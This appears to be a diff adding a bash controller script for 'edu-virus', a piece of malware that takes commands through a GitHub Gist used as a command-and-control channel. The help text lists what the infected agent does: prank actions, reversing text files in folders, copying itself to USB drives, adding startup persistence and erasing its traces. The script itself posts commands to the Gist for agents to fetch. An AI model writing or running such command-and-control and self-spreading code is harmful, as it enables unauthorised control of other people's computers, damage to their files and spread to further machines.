@@ -1,0 +1,117 @@
+#!/bin/bash
+# edu-virus — Send commands to your C2 Gist
+# Usage: ./edu-virus <command> [args...]
+#
+# Examples:
+#   ./edu-virus ping
+#   ./edu-virus popup "Hello" "World"
+#   ./edu-virus notepad "5" "Pranked!"
+#   ./edu-virus mouse "15"
+#   ./edu-virus kill
+#   ./edu-virus -i  (interactive mode)
+
+GIST_ID="99a46fc04b180fffdafc03584c0d5a2e"
+GIST_FILE="c2_command.txt"
+RAW_URL="https://api.github.com/gists/${GIST_ID}"
+
+show_help() {
+    echo "EDU-VIRUS C2 Controller"
+    echo "Usage: ./edu-virus <command> [args...]"
+    echo ""
+    echo "Commands:"
+    echo "  ping           Show agent info (message box)"
+    echo "  popup t m      Show message box (title, message)"
+    echo "  notepad n t    Open N Notepad windows with text"
+    echo "  wallpaper url  Change desktop wallpaper"
+    echo "  restore        Restore original wallpaper"
+    echo "  mouse sec      Jiggle mouse for N seconds"
+    echo "  tray o|c       Open/close CD tray"
+    echo "  flash c n      Screen flash (red/green/blue/random)"
+    echo "  cursor p       Move cursor (spiral/square/random)"
+    echo "  reversetxt p   Reverse .txt files in folder"
+    echo "  replicate      Copy to USB drives / Public"
+    echo "  persist        Add to startup registry"
+    echo "  unpersist      Remove from startup"
+    echo "  kill           Self-destruct (remove all traces)"
+    echo "  help           Show this help"
+    echo ""
+    echo "Target a specific agent:"
+    echo "  ./edu-virus target:AGENTID <cmd> <args...>"
+}
+
+if [ $# -eq 0 ] || [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
+    show_help
+    exit 0
+fi
+
+if [ "$1" = "-i" ]; then
+    echo "Interactive mode. Type 'exit' to quit."
+    while true; do
+        read -p "edu-virus> " cmd args
+        [ "$cmd" = "exit" ] || [ "$cmd" = "quit" ] && break
+        [ -z "$cmd" ] && continue
+        set -- $cmd $args
+        # Fall through to normal handling
+        break
+    done
+    exit 0
+fi
+
+# Build args JSON, handling targeting
+TARGET=""
+CMD="$1"
+shift
+ARGS=("$@")
+
+# Check for targeting prefix
+if [[ "$CMD" == target:* ]]; then
+    TARGET="$CMD"
+    CMD="${ARGS[0]}"
+    ARGS=("${ARGS[@]:1}")
+fi
+
+# Build JSON payload
+if [ ${#ARGS[@]} -eq 0 ]; then
+    JSON="{\"cmd\":\"$CMD\",\"args\":[],\"id\":\"$(date +%s)\"}"
+else
+    # Build JSON array of strings
+    ARRAY="["
+    SEP=""
+    for arg in "${ARGS[@]}"; do
+        ESCAPED=$(python3 -c "import json; print(json.dumps('$arg'))" 2>/dev/null)
+        ARRAY="${ARRAY}${SEP}${ESCAPED}"
+        SEP=","
+    done
+    ARRAY="$ARRAY]"
+    JSON="{\"cmd\":\"$CMD\",\"args\":$ARRAY,\"id\":\"$(date +%s)\"}"
+fi
+
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "  Sending: $CMD ${ARGS[@]}"
+echo "  JSON:    $JSON"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+
+# Write to temp file and update Gist
+echo "$JSON" > /tmp/c2_update.txt
+python3 -c "
+import json, subprocess, tempfile, os, sys
+
+payload = {
+    'description': 'EDU-Virus C2 - $(date +%H:%M)',
+    'files': {
+        '${GIST_FILE}': {
+            'content': sys.argv[1]
+        }
+    }
+}
+tmp = os.path.join(tempfile.gettempdir(), 'gist_update.json')
+with open(tmp, 'w') as f:
+    json.dump(payload, f)
+subprocess.run(['gh', 'api', '-X', 'PATCH', 'gists/${GIST_ID}',
+    '--input', tmp, '--jq', '.files[\"${GIST_FILE}\"].content'],
+    capture_output=True, text=True, timeout=15)
+os.unlink(tmp)
+print('Command sent! Virus picks it up within 30s.')
+" "$JSON"
+
+echo "RAW URL: $RAW_URL"
